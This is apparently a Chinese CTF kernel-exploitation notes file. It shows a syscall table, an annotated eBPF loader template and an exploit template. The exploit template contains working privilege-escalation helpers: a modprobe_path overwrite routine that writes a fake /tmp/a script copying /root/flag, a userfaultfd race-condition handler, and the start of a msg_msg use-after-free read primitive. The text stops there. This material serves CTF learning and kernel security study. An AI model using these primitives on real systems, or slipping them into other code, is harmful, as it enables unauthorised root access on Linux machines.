|swapoff                       |common|168|
|reboot                        |common|169|
|sethostname                   |common|170|
|setdomainname                 |common|171|
|iopl                          |common|172|
|ioperm                        |common|173|
|create_module                 |64    |174|
|init_module                   |common|175|
|delete_module                 |common|176|
|get_kernel_syms               |64    |177|
|query_module                  |64    |178|
|quotactl                      |common|179|
|nfsservctl                    |64    |180|
|getpmsg                       |common|181|
|putpmsg                       |common|182|
|afs_syscall                   |common|183|
|tuxcall                       |common|184|
|security                      |common|185|
|gettid                        |common|186|
|readahead                     |common|187|
|setxattr                      |common|188|
|lsetxattr                     |common|189|
|fsetxattr                     |common|190|
|getxattr                      |common|191|
|lgetxattr                     |common|192|
|fgetxattr                     |common|193|
|listxattr                     |common|194|
|llistxattr                    |common|195|
|flistxattr                    |common|196|
|removexattr                   |common|197|
|lremovexattr                  |common|198|
|fremovexattr                  |common|199|
|tkill                         |common|200|
|time                          |common|201|
|futex                         |common|202|
|sched_setaffinity             |common|203|
|sched_getaffinity             |common|204|
|set_thread_area               |64    |205|
|io_setup                      |64    |206|
|io_destroy                    |common|207|
|io_getevents                  |common|208|
|io_submit                     |64    |209|
|io_cancel                     |common|210|
|get_thread_area               |64    |211|
|lookup_dcookie                |common|212|
|epoll_create                  |common|213|
|epoll_ctl_old                 |64    |214|
|epoll_wait_old                |64    |215|
|remap_file_pages              |common|216|
|getdents64                    |common|217|
|set_tid_address               |common|218|
|restart_syscall               |common|219|
|semtimedop                    |common|220|
|fadvise64                     |common|221|
|timer_create                  |64    |222|
|timer_settime                 |common|223|
|timer_gettime                 |common|224|
|timer_getoverrun              |common|225|
|timer_delete                  |common|226|
|clock_settime                 |common|227|
|clock_gettime                 |common|228|
|clock_getres                  |common|229|
|clock_nanosleep               |common|230|
|exit_group                    |common|231|
|epoll_wait                    |common|232|
|epoll_ctl                     |common|233|
|tgkill                        |common|234|
|utimes                        |common|235|
|vserver                       |64    |236|
|mbind                         |common|237|
|set_mempolicy                 |common|238|
|get_mempolicy                 |common|239|
|mq_open                       |common|240|
|mq_unlink                     |common|241|
|mq_timedsend                  |common|242|
|mq_timedreceive               |common|243|
|mq_notify                     |64    |244|
|mq_getsetattr                 |common|245|
|kexec_load                    |64    |246|
|waitid                        |64    |247|
|add_key                       |common|248|
|request_key                   |common|249|
|keyctl                        |common|250|
|ioprio_set                    |common|251|
|ioprio_get                    |common|252|
|inotify_init                  |common|253|
|inotify_add_watch             |common|254|
|inotify_rm_watch              |common|255|
|migrate_pages                 |common|256|
|openat                        |common|257|
|mkdirat                       |common|258|
|mknodat                       |common|259|
|fchownat                      |common|260|
|futimesat                     |common|261|
|newfstatat                    |common|262|
|unlinkat                      |common|263|
|renameat                      |common|264|
|linkat                        |common|265|
|symlinkat                     |common|266|
|readlinkat                    |common|267|
|fchmodat                      |common|268|
|faccessat                     |common|269|
|pselect6                      |common|270|
|ppoll                         |common|271|
|unshare                       |common|272|
|set_robust_list               |64    |273|
|get_robust_list               |64    |274|
|splice                        |common|275|
|tee                           |common|276|
|sync_file_range               |common|277|
|vmsplice                      |64    |278|
|move_pages                    |64    |279|
|utimensat                     |common|280|
|epoll_pwait                   |common|281|
|signalfd                      |common|282|
|timerfd_create                |common|283|
|eventfd                       |common|284|
|fallocate                     |common|285|
|timerfd_settime               |common|286|
|timerfd_gettime               |common|287|
|accept4                       |common|288|
|signalfd4                     |common|289|
|eventfd2                      |common|290|
|epoll_create1                 |common|291|
|dup3                          |common|292|
|pipe2                         |common|293|
|inotify_init1                 |common|294|
|preadv                        |64    |295|
|pwritev                       |64    |296|
|rt_tgsigqueueinfo             |64    |297|
|perf_event_open               |common|298|
|recvmmsg                      |64    |299|
|fanotify_init                 |common|300|
|fanotify_mark                 |common|301|
|prlimit64                     |common|302|
|name_to_handle_at             |common|303|
|open_by_handle_at             |common|304|
|clock_adjtime                 |common|305|
|syncfs                        |common|306|
|sendmmsg                      |64    |307|
|setns                         |common|308|
|getcpu                        |common|309|
|process_vm_readv              |64    |310|
|process_vm_writev             |64    |311|
|kcmp                          |common|312|
|finit_module                  |common|313|
|sched_setattr                 |common|314|
|sched_getattr                 |common|315|
|renameat2                     |common|316|
|seccomp                       |common|317|
|getrandom                     |common|318|
|memfd_create                  |common|319|
|kexec_file_load               |common|320|
|bpf                           |common|321|
|execveat                      |64    |322|
|userfaultfd                   |common|323|
|membarrier                    |common|324|
|mlock2                        |common|325|
|copy_file_range               |common|326|
|preadv2                       |64    |327|
|pwritev2                      |64    |328|
|pkey_mprotect                 |common|329|
|pkey_alloc                    |common|330|
|pkey_free                     |common|331|
|statx                         |common|332|
|io_pgetevents                 |common|333|
|rseq                          |common|334|
|pidfd_send_signal             |common|424|
|io_uring_setup                |common|425|
|io_uring_enter                |common|426|
|io_uring_register             |common|427|
|open_tree                     |common|428|
|move_mount                    |common|429|
|fsopen                        |common|430|
|fsconfig                      |common|431|
|fsmount                       |common|432|
|fspick                        |common|433|
|pidfd_open                    |common|434|
|clone3                        |common|435|
|close_range                   |common|436|
|openat2                       |common|437|
|pidfd_getfd                   |common|438|
|faccessat2                    |common|439|
|process_madvise               |common|440|
|epoll_pwait2                  |common|441|
|mount_setattr                 |common|442|
|quotactl_fd                   |common|443|
|landlock_create_ruleset       |common|444|
|landlock_add_rule             |common|445|
|landlock_restrict_self        |common|446|
|memfd_secret                  |common|447|
|process_mrelease              |common|448|
|futex_waitv                   |common|449|
|set_mempolicy_home_node       |common|450|
|rt_sigaction                  |x32   |512|
|rt_sigreturn                  |x32   |513|
|ioctl                         |x32   |514|
|readv                         |x32   |515|
|writev                        |x32   |516|
|recvfrom                      |x32   |517|
|sendmsg                       |x32   |518|
|recvmsg                       |x32   |519|
|execve                        |x32   |520|
|ptrace                        |x32   |521|
|rt_sigpending                 |x32   |522|
|rt_sigtimedwait               |x32   |523|
|rt_sigqueueinfo               |x32   |524|
|sigaltstack                   |x32   |525|
|timer_create                  |x32   |526|
|mq_notify                     |x32   |527|
|kexec_load                    |x32   |528|
|waitid                        |x32   |529|
|set_robust_list               |x32   |530|
|get_robust_list               |x32   |531|
|vmsplice                      |x32   |532|
|move_pages                    |x32   |533|
|preadv                        |x32   |534|
|pwritev                       |x32   |535|
|rt_tgsigqueueinfo             |x32   |536|
|recvmmsg                      |x32   |537|
|sendmmsg                      |x32   |538|
|process_vm_readv              |x32   |539|
|process_vm_writev             |x32   |540|
|setsockopt                    |x32   |541|
|getsockopt                    |x32   |542|
|io_setup                      |x32   |543|
|io_submit                     |x32   |544|
|execveat                      |x32   |545|
|preadv2                       |x32   |546|
|pwritev2                      |x32   |547|

#### BPF姿势

下面是一个BPF的模板
```c
#define _GNU_SOURCE
#include <linux/bpf.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/syscall.h> 
#include <sys/types.h>
#include <unistd.h>


#define assert(cond) \
{ \
    if(!(cond)) \
    { \
        printf("Line:%d: '%s' assertion failed\n", \
               __LINE__, #cond); \
        perror(#cond); \
        fflush(stdout); \
        exit(EXIT_FAILURE); \
    } \
}

/* ebpf用户态helper宏和函数
 * 
 * 参数:
 *      1. @cmd，表明bpf()执行的操作
 *      2. @attr，表明此次执行的操作的参数
 *      3. @size，即@attr union结构体的大小
 */
int bpf(int cmd, union bpf_attr *attr,
        unsigned int size)
{
    return syscall(SYS_bpf, cmd, attr, size);
}
/* bpf_create_map()创建一个新的map，并且返回该map对应的文件描述符
 * 
 * 参数:
 *      1. @map_type：即该map的类型，可以通过man bpf，搜索
 * bpf_map_type \{关键词查看
 *      2. @key_size: 即map的key元素的字节数
 *      3. @value_size: 即map的value元素的字节数
 *      4. @max_entries: 这个map所允许的最大映射数
 *
 * 返回值：
 *      @ret：返回相应的文件描述符
 */
int bpf_create_map(enum bpf_map_type map_type,
                   unsigned int key_size,
                   unsigned int value_size,
                   unsigned int max_entries)
{
    union bpf_attr attr = {
        .map_type    = map_type,
        .key_size    = key_size,
        .value_size  = value_size,
        .max_entries = max_entries
    };

    return bpf(BPF_MAP_CREATE, &attr, sizeof(attr));
}
/* bpf_lookup_elem()在fd对应的map中，查找key元素为@key的映射
 * 的value值，并将映射的value值赋给@value
 *
 * 参数
 *      1. @fd: 要查找的map对应的文件描述符
 *      2. @key: 映射key元素的地址
 *      3. @value：映射value元素的buf地址
 *
 * 返回值：
 *      @ret：成功找到元素，则返回@value元素的字节数
 */
int bpf_lookup_elem(int fd, const void *key, void *value)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (__aligned_u64)key,
        .value  = (__aligned_u64)value,
    };

    return bpf(BPF_MAP_LOOKUP_ELEM, &attr, sizeof(attr));
}
/* bpf_update_elem()在fd对应的map中，创建/更新映射对
 *
 * 参数
 *      1. @fd: 要查找的map对应的文件描述符
 *      2. @key: 映射key元素的地址
 *      3. @value：映射value元素的buf地址
 *      4. @flags:用来设置此次操作的类型
 * BPF_NOEXIST，表示仅仅在@key不存在时创建映射；
 * BPF_EXIST，表示仅仅在@key存在是更新映射;
 * BPF_ANY,表示如果存在，则更新，否则创建即可
 *
 * 返回值：
 *      @ret:成功更新或添加则返回0
 */
int bpf_update_elem(int fd, const void *key,
                    const void *value,
                    uint64_t flags)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (__aligned_u64)key,
        .value  = (__aligned_u64)value,
        .flags  = flags,
    };

    return bpf(BPF_MAP_UPDATE_ELEM, &attr, sizeof(attr));
}
/* bpf_delete_elem()在fd对应的map中，查找key元素为@key的映射
 * 并删除
 *
 * 参数
 *      1. @fd: 要查找的map对应的文件描述符
 *      2. @key: 映射key元素的地址
 *
 * 返回值
 *      @ret: 成功找到并删除返回0
 */
int bpf_delete_elem(int fd, const void *key)
{
    union bpf_attr attr = {
        .map_fd = fd,
        .key    = (__aligned_u64)key,
    };

    return bpf(BPF_MAP_DELETE_ELEM, &attr, sizeof(attr));
}
/* bpf_prog_load将ebpf程序载入内核中执行，并返回相关的文件描述符
 * 
 * 参数:
 *      1. @type：即bpf程序的类型，可以通过man bpf，搜索
 * bpf_prog_type \{关键词查看
 *      2. @insns: 即struct bpf_insn数组，一组指令组成一个
 * bpf数组
 *      3. @insn_cnt:即@insns数组的元素个数
 *
 * 返回值：
 *      @ret: ebpf程序关联的文件描述符
 */
int bpf_prog_load(enum bpf_prog_type type,
                  const struct bpf_insn *insns,
                  int insn_cnt)
{
    int bpf_log_size = 0x1000, ret;
    char *bpf_log;

    assert((bpf_log = malloc(bpf_log_size)) != NULL);

    union bpf_attr attr = {
        .prog_type      = type,
        .insns          = (__aligned_u64)insns,
        .insn_cnt       = insn_cnt,
        .license        = (__aligned_u64)"GPL",
        .log_buf        = (__aligned_u64)bpf_log,
        .log_size       = bpf_log_size,
        .log_level      = 2,
    };

    ret = bpf(BPF_PROG_LOAD, &attr, sizeof(attr));
    printf("[bpf]\n%s\n", bpf_log);
    fflush(stdout);
    free(bpf_log);

    assert(ret > 0);
    return ret;
}
#define bpf_prog_load(type, insns)    \
        bpf_prog_load((type), (insns), \
                      sizeof((insns)) / sizeof((insns)[0]))
/* struct bpf_insn的wrapper宏,
 * 参考自内核源代码中的kernel/samples/bpf/bpf_insn.h
 * 其余相关的宏参考/usr/include/linux/bpf_common.h
 *
 * ebpf的指令集信息可参考
 * https://docs.kernel.org/bpf/instruction-set.html
 *
 * R0: return value from function calls, and exit value for eBPF programs
 * R1 - R5: arguments for function calls
 * R6 - R9: callee saved registers that function calls will preserve
 * R10: read-only frame pointer to access stack

 */
#define BPF_RAW_INSN(CODE, DST, SRC, OFF, IMM)  \
  ((struct bpf_insn) {                          \
    .code     = CODE,                           \
    .dst_reg  = DST,                            \
    .src_reg  = SRC,                            \
    .off      = OFF,                            \
    .imm      = IMM })
/* dst_reg OP= src_reg,
 *
 * OP包括如下候选
 * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)
 * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&)
 * BPF_LSH(<<)  BPF_RSH(>>) BPF_NEG(~)
 * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_ALU64_REG(OP, DST, SRC)             \
  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_X,  \
               DST, SRC, 0, 0)
#define BPF_ALU32_REG(OP, DST, SRC)             \
  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_X,  \
               DST, SRC, 0, 0)
/* dst_reg OP= imm32,
 * OP包括如下候选
 * BPF_ADD(+)   BPF_SUB(-)  BPF_MUL(*)
 * BPF_DIV(/)   BPF_OR(|)   BPF_AND(&)
 * BPF_LSH(<<)  BPF_RSH(>>) BPF_NEG(~)
 * BPF_MOD(%)   BPF_XOR(^)  BPF_MOV(=)
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_ALU64_IMM32(OP, DST, IMM)           \
  BPF_RAW_INSN(BPF_ALU64 | BPF_OP(OP) | BPF_K,  \
               DST, 0, 0, (IMM))
#define BPF_ALU32_IMM32(OP, DST, IMM)             \
  BPF_RAW_INSN(BPF_ALU | BPF_OP(OP) | BPF_K,  \
               DST, 0, 0, (IMM))
/* *(dst_reg + off16) = imm32
 * SIZE包括如下候选
 * BPF_B(8-bit)   BPF_H(16-bit)
 * BPF_W(32-bit)  BPF_DW(64-bit)
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_ST_MEM(SIZE, DST, OFF, IMM)   \
  BPF_RAW_INSN(BPF_ST | BPF_SIZE(SIZE) | BPF_MEM,   \
               DST, 0, OFF, IMM)
/* *(dst_reg + off16) = src_reg
 * SIZE包括如下候选
 * BPF_B(8-bit)   BPF_H(16-bit)
 * BPF_W(32-bit)  BPF_DW(64-bit)
 * 
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_STX_MEM(SIZE, DST, SRC, OFF)   \
  BPF_RAW_INSN(BPF_STX | BPF_SIZE(SIZE) | BPF_MEM,   \
               DST, SRC, OFF, 0)
/* dst_reg = *(src_reg + off16)
 * SIZE包括如下候选
 * BPF_B(8-bit)   BPF_H(16-bit)
 * BPF_W(32-bit)  BPF_DW(64-bit)
 * 
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_LDX_MEM(SIZE, DST, SRC, OFF)   \
  BPF_RAW_INSN(BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,   \
               DST, SRC, OFF, 0)
/* dst_reg = *(imm64)
 * SIZE包括如下候选
 * BPF_B(8-bit)   BPF_H(16-bit)
 * BPF_W(32-bit)  BPF_DW(64-bit)
 * 
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_LD_IMM64(DST, IMM)  \
  BPF_RAW_INSN(BPF_LD | BPF_DW | BPF_IMM,     \
               DST, 0, 0, (__u32)(IMM)),      \
  BPF_RAW_INSN(0, 0, 0, 0, ((__64)(IMM)) >> 32)
/* if (dst_reg OP src_reg) goto pc + off16
 * OP包括如下候选
 * BPF_JEQ(==)          BPF_JGT(unsigned <)
 * BPF_JGE(unsigned >=) BPF_JNE(!=)
 * BPF_JLT(unsigned <)  BPF_JLE(unsigned <=)
 * BPF_CALL             BPF_EXIT
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_JMP_REG(OP, DST, SRC, OFF)  \
  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \
               DST, SRC, OFF, 0)
#define BPF_JMP32_REG(OP, DST, SRC, OFF)  \
  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_X,  \
               DST, SRC, OFF, 0)
/* if (dst_reg OP imm32) goto pc + off16
 * OP包括如下候选
 * BPF_JEQ(==)          BPF_JGT(unsigned <)
 * BPF_JGE(unsigned >=) BPF_JNE(!=)
 * BPF_JLT(unsigned <)  BPF_JLE(unsigned <=)
 * BPF_CALL(参考man bpf-helpers，调用)
 * BPF_EXIT
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_JMP_IMM32(OP, DST, IMM, OFF)  \
  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \
               DST, 0, OFF, IMM)
#define BPF_JMP32_IMM32(OP, DST, IMM, OFF)  \
  BPF_RAW_INSN(BPF_JMP32 | BPF_OP(OP) | BPF_K,  \
               DST, 0, OFF, IMM)
/* if (!(dst_reg OP src_reg)) exit
 * OP包括如下候选
 * BPF_JEQ(==)          BPF_JGT(unsigned <)
 * BPF_JGE(unsigned >=) BPF_JNE(!=)
 * BPF_JLT(unsigned <)  BPF_JLE(unsigned <=)
 * BPF_CALL(参考man bpf-helpers，调用)
 * BPF_EXIT
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_EXIT_INSN()  \
  BPF_RAW_INSN(BPF_JMP | BPF_EXIT, 0, 0, 0, 0)
#define BPF_ASSERT_REG(OP, DST, SRC) \
  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_X,  \
               DST, SRC, 1, 0), \
  BPF_EXIT_INSN()
/* if (!(dst_reg OP imm32)) exit
 * OP包括如下候选
 * BPF_JEQ(==)          BPF_JGT(unsigned <)
 * BPF_JGE(unsigned >=) BPF_JNE(!=)
 * BPF_JLT(unsigned <)  BPF_JLE(unsigned <=)
 * BPF_CALL(参考man bpf-helpers，调用)
 * BPF_EXIT
 * ...，参考https://docs.kernel.org/bpf/instruction-set.html
 *
 * REG包括如下候选
 * BPF_REG_0  BPF_REG_1  BPF_REG_2
 * BPF_REG_3  BPF_REG_4  BPF_REG_5
 * BPF_REG_6  BPF_REG_7  BPF_REG_8
 * BPF_REG_9  BPF_REG_10
 */
#define BPF_ASSERT_IMM32(OP, DST, IMM) \
  BPF_RAW_INSN(BPF_JMP | BPF_OP(OP) | BPF_K,  \
               DST, 0, 1, IMM), \
  BPF_EXIT_INSN()
/* bpf_prog_load()将bpf程序装载入内核中，然后trigger_bpf()
 * 会将对应的bpf程序关联到对应事件的hook点，并产生相关事件，来
 * 触发执行对应的bpf程序
 *
 * 参数:
 *    1. @progfd:即bpf_prog_load()返回的关联bpf程序的文件描述符
 */
void trigger_bpf(int progfd)
{
  int sockets[2];
  char buf[0x80] = {0};

  // 将bpf程序关联到该socket的PACKET FILTER事件
  assert(socketpair(AF_UNIX, SOCK_DGRAM, 0, sockets) == 0);
  assert(setsockopt(sockets[0], SOL_SOCKET, SO_ATTACH_BPF, &progfd, sizeof(progfd)) == 0);

  // 向socket中写数据，从而触发PACKET FILTER事件，执行关联的bpf程序
  assert(write(sockets[1], buf, sizeof(buf)) == sizeof(buf));
}


int main(void) {

  int progfd;

  struct bpf_insn insns[] = {
    BPF_ALU64_IMM32(BPF_MOV, BPF_REG_0, 0x1737),    /* r0 = 0x1737 */
    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_0, 0x1737),   /* assert(r0 = 0x1737) */
    BPF_ALU64_REG(BPF_MOV, BPF_REG_2, BPF_REG_0),   /* r2 = r0 */
    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_2, 0x1737),   /* assert(r2 = 0x1737) */
    BPF_STX_MEM(BPF_DW, BPF_REG_10, BPF_REG_2, -0x8), /* *(uint64_t*)(r10 - 0x8) = r2 */
    BPF_LDX_MEM(BPF_B, BPF_REG_9, BPF_REG_10, -0x8), /* r9 = *(uint8_t*)(r10 - 0x8) */
    BPF_ASSERT_IMM32(BPF_JEQ, BPF_REG_9, 0x37),     /* assert(r9 = 0x37) */
    BPF_EXIT_INSN(),                                /* exit */
  };

  progfd = bpf_prog_load(BPF_PROG_TYPE_SOCKET_FILTER, insns);

  /* 创建一个socket，并发送数据包，从而触发bpf */
  trigger_bpf(progfd);

  return 0;
}
```

#### 模板姿势

```c
#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <keyutils.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/stat.h>
#include <sys/syscall.h> 
#include <sys/types.h>
#include <unistd.h>


/* Global variables
 * 定义使用到的全局变量
 * 使用 gXXX 统一命名，避免与局部变量命名冲突
 */
int gfd1, gfd2, gfd3, gfd4;
void *gaddr1, *gaddr2, *gaddr3, *gaddr4;
uint64_t glen1, glen2, glen3, glen4;


/* Structures
 * 定义辅助结构体
 */
struct list_head {
	struct list_head *next, *prev;
};


/* Macros
 * 定义辅助宏
 */
#define assert(cond) \
{ \
    if(!(cond)) \
    { \
        printf("Line:%d: '%s' assertion failed\n", \
               __LINE__, #cond); \
        perror(#cond); \
        fflush(stdout); \
        exit(EXIT_FAILURE); \
    } \
}
#define offsetof(TYPE, MEMBER) \
    ((size_t) &((TYPE*)0)->MEMBER)
#define __X32_SYSCALL_BIT   0x40000000
#define syscall_x32(nr, args...) \
    syscall((nr) + __X32_SYSCALL_BIT, ##args)
/* 在/usr/include/x86_64-linux-gnu/bits/syscall.h中
 * 查看x64下的系统调用信息
 */
#define syscall_x64(nr, args...) \
    syscall((nr), ##args)


/* modprobe_path提权
 * 条件:
 *      1. 覆写`modprobe_path`符号的内容从`/sbin/modprobe`
 * 更改为 `/tmp/a`, 即 *(modprobe_path) = 0x612f706d742f
 *
 *
 * 参考:
 * https://www.anquanke.com/post/id/232545#h3-6
 */
void modprobe_exp()
{
    printf("[modprobe_exp] set fake modprobe content\n");
    fflush(stdout);
    system("echo '#!/bin/sh' > /tmp/a");
    system("echo 'cp /root/flag /tmp/flag' >> /tmp/a");
    system("echo 'chmod 777 /tmp/flag' >> /tmp/a");


    printf("[modprobe_exp] set fake modprobe permission\n");
    fflush(stdout);
    system("chmod +x /tmp/a");


    printf("[modprobe_exp] set unknown file content\n");
    fflush(stdout);
    system("echo -ne '\\xff\\xff\\xff\\xff' > /tmp/dummy");


    printf("[modprobe_exp] set unknown file permission\n");
    fflush(stdout);
    system("chmod +x /tmp/dummy");


    printf("[modprobe_exp] run unknown file\n");
    fflush(stdout);
    system("/tmp/dummy");


    printf("[modprobe_exp] read the flag\n");
    fflush(stdout);
    system("cat /tmp/flag");
}

/* userfaultfd条件竞争
 * 条件:
 *      1. userfaultfd机制被启用
 *      2. userfaultfd保护机制被关闭，即
 * /proc/sys/vm/unprivileged_userfaultfd 被设置为1
 *
 *
 * 参数:
 *      1. userfaultfd_exp():@addr是通过
 * mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE
        | MAP_ANONYMOUS, -1, 0) 申请的，此时内核仅仅分配了页表，
 * 并未分配物理页进行映射
 *      2. userfaultfd_exp():@len为通过mmap申请@addr时，传入的@len值
 *      3. userfaultfd_exp():@thread为自定义的进程 handler，其用于与内核进行交互，
 * 从而触发page fault
 *      3. userfaultfd_exp():@handler为自定义的userfaultfd handler，
 * 其会在内核进程触发page fault时，在userfaultfd_handler中被调用。
 * 其接受@page为参数，@page页内容在调用完@handler后，被用于初始化分配给内核进程的页
 *
 *
 * 返回值:
 *      1. userfaultfd_exp():@ret返回@thread创建的pthread_t，用于进程同步. 
 * 在直白一些，通过调用pthread_join(@ret)，确保@thread已经触发page fault，
 * 并且@handler已经被执行结束
 *
 *
 * 参考:
 * https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/userfaultfd/
 */
struct uffd_arg {
    int uffd;                       /* 在userfaultfd_exp()中的uffd局部变量 */
    void *(*handler)(void *page);   /* 在userfaultfd_handler()中，执行的用户自定义
                                     * handler, 其中参数@page内容将在userfaultfd_handler()
                                     * 中，被用于初始化触发page fault的页 */
    int pg_size;                    /* 即页的大小 */
};
static void * userfaultfd_handler(void *arg)
{
    struct uffd_msg msg;
    char *page = NULL;
    struct uffdio_copy uffdio_copy;
    struct uffd_arg *uffd_arg = arg;

    printf("[userfaultfd_handler] create the page\n");
    if(page == NULL)
        assert((page = mmap(NULL, uffd_arg->pg_size, PROT_READ | PROT_WRITE,
                            MAP_PRIVATE | MAP_ANONYMOUS, -1, 0))
                != MAP_FAILED);

    for (;;) {

        struct pollfd pollfd;

        printf("[userfaultfd_handler] wait for event\n");
        pollfd.fd = uffd_arg->uffd;
        pollfd.events = POLLIN;
        assert(poll(&pollfd, 1, -1) != -1);

        printf("[userfaultfd_handler] read the event\n");
        assert(read(uffd_arg->uffd, &msg, sizeof(msg)) != 0);
        assert(msg.event == UFFD_EVENT_PAGEFAULT);

        printf("[userfaultfd_handler] execute user-defined handler\n");
        (*uffd_arg->handler)(page);

        printf("[userfaultfd_handler] handle page fault\n");
        uffdio_copy.src = (unsigned long) page;
        uffdio_copy.dst = (unsigned long) msg.arg.pagefault.address &
                          ~(uffd_arg->pg_size - 1);
        uffdio_copy.len = uffd_arg->pg_size;
        uffdio_copy.mode = 0;
        uffdio_copy.copy = 0;
        assert(ioctl(uffd_arg->uffd, UFFDIO_COPY, &uffdio_copy) != -1);
    }

    return NULL;
}
pthread_t userfaultfd_exp(void *addr, uint64_t len, void *(*thread)(void *arg),
                     void *(*handler)(void *page))
{
    int uffd;
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    struct uffd_arg* uffd_arg;
    const int PG_SIZE = sysconf(_SC_PAGE_SIZE);
    pthread_t thr;


    printf("[userfaultfd_exp] create userfaultfd object\n");
    assert((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) != -1);


    printf("[userfaultfd_exp] set the userfaultfd api\n");
    uffdio_api.api = UFFD_API;
    uffdio_api.features = 0;
    assert(ioctl(uffd, UFFDIO_API, &uffdio_api) != -1);

    printf("[userfaultfd_exp] register the memory range\n");
    uffdio_register.range.start = (unsigned long) addr;
    uffdio_register.range.len = (len + PG_SIZE - 1) / PG_SIZE * PG_SIZE;
    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
    assert(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) != -1);

    printf("[userfaultfd_exp] create the thread to handle userfaultfd events\n");
    assert((uffd_arg = malloc(sizeof(*uffd_arg))) != NULL);
    uffd_arg->uffd = uffd;
    uffd_arg->handler = handler;
    uffd_arg->pg_size = PG_SIZE;
    assert(pthread_create(&thr, NULL, userfaultfd_handler, uffd_arg) != -1);

    printf("[userfaultfd_exp] create the thread to trigger the page fault\n");
    assert(pthread_create(&thr, NULL, thread, NULL) != -1);

    return thr;
}

/* struct msg_msg读
 * 结构体:
 *          struct msg_msg {
 *              struct list_head m_list;
 *              long m_type;
 *              size_t m_ts;    // message text大小
 *              struct msg_msgseg *next;
 *              void *security; // 由于未开启SELinux，该字段恒为0
 *              // 用户定义数据从这里开始
 *          };
 *
 * 条件:
 *      1. 驱动中存在UAF，块大小为[0x30, 0x2000]，可以更改内存的[0x18, 0x28)处的值
 *      2. 如果更改了内存的[0x0, 0x10)的值，则需要调用recv_msg()，其需要内核
 * 开启CONFIG_CHECKPOINT_RESTORE设置；否则调用recv_msg_nocopy()即可
 *      3. recv_msg()读取信息时，需要和struct msg_msg的m_ts相同大小，否则会
 * 返回异常
 *
 * 参数:
 *      1. send_msg():@size，指内核态申请的内存大小，其会包含0x30的
 * struct msg_msg头
 *      2. send_msg():@content, 即用户定义的消息内容，其会被复制到
 * 内核态申请的内存中，主要用来查找这部分内存，可以设置为标志性字符串，如
 * "hhaawwkk1"等
 *      3. recv_msg*():@qid，消息队列id，用来标识不同队列，是send_msg()
 * 返回值
 *      4. recv_msg*():@size，想要从消息队列中获取的字节数，其包含0x8的mtype
 * 内容和struct msg_msg头和@size的数据
 *
 * 返回值:
 *      1. send_msg():@ret返回创建的消息队列id
 *      2. recv_msg*():@ret返回读取的缓冲数组
 *
 * 参考:
 * https://www.anquanke.com/post/id/252558
